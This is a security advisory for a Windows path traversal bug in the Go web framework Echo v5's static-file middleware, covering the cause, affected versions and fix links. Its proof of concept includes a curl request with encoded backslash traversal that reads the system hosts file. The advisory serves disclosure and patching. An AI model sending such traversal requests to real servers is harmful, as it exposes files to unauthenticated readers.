# [M] Echo has a Windows path traversal via backslash in middleware.Static default filesystem

## Summary
Severity: Medium
Advisory: GHSA-pgvm-wxw2-hrv9
CVE: CVE-2026-25766
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-02-17
Source: https://github.com/advisories/GHSA-pgvm-wxw2-hrv9
Type: github-advisory

## Affected
- Go: `github.com/labstack/echo/v5` — affected >=5.0.0 <5.0.3

## Details
### Summary
On Windows, Echo’s `middleware.Static` using the default filesystem allows path traversal via backslashes, enabling
unauthenticated remote file read outside the static root.

### Details  

  In `middleware/static.go`, the requested path is unescaped and normalized with `path.Clean` (URL semantics).
  `path.Clean` does **not** treat `\` as a path separator, so `..\` sequences remain in the cleaned path. The resulting
  path is then passed to `currentFS.Open(...)`. When the filesystem is left at the default (nil), Echo uses `defaultFS`
  which calls `os.Open` (`echo.go:792`). On Windows, `os.Open` treats `\` as a path separator and resolves `..\`,
  allowing traversal outside the static root.

  Relevant code:
  - `middleware/static.go` (path unescape + `path.Clean` + `currentFS.Open`)
  - `echo.go` `defaultFS.Open` → `os.Open`

  This is the same class as CVE-2020-36565 (fixed in v4 by switching to OS-aware cleaning), but in v5 the `path.Clean`
  + defaultFS combination reintroduces the Windows backslash traversal.


### PoC
 Windows only.

  **Sample code (main.go):**
  ```go
  package main

  import (
        "log"
        "net/http"

        "github.com/labstack/echo/v5"
        "github.com/labstack/echo/v5/middleware"
  )

  func main() {
        e := echo.New()

        // Important: use middleware.Static with default filesystem (nil)
        e.Use(middleware.Static("public"))

        e.GET("/healthz", func(c *echo.Context) error {
                return c.String(http.StatusOK, "ok")
        })

        addr := ":1323"
        log.Printf("listening on %s", addr)
        if err := e.Start(addr); err != nil && err != http.ErrServerClosed {
                log.Fatal(err)
        }
  }
 ```
  Static file:

  public/index.html

  (content can be any HTML)

  **Run:**
  go run .

  **Verify:**

  curl http://localhost:1323/index.html
  curl --path-as-is "http://localhost:1323/..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts"
  Expected: 404  

  **Screenshot:**
<img width="884" height="689" alt="image" src="https://github.com/user-attachments/assets/acb14d70-2a43-47c1-8927-2f3da491a853" />
<img width="1022" height="162" alt="image" src="https://github.com/user-attachments/assets/f2b92aa2-541e-461d-81a2-8a5907d7a447" />



  ### Impact
  Path traversal leading to arbitrary file read outside the static root. Any unauthenticated remote user can
  read local files that the Echo process has access to on Windows, if `middleware.Static` is used with the default
  filesystem.

## References
- https://github.com/labstack/echo/security/advisories/GHSA-pgvm-wxw2-hrv9
- https://nvd.nist.gov/vuln/detail/CVE-2026-25766
- https://github.com/labstack/echo/pull/2891
- https://github.com/labstack/echo/commit/b1d443086ea27cf51345ec72a71e9b7e9d9ce5f1
- https://github.com/labstack/echo
- https://pkg.go.dev/vuln/GO-2026-4502
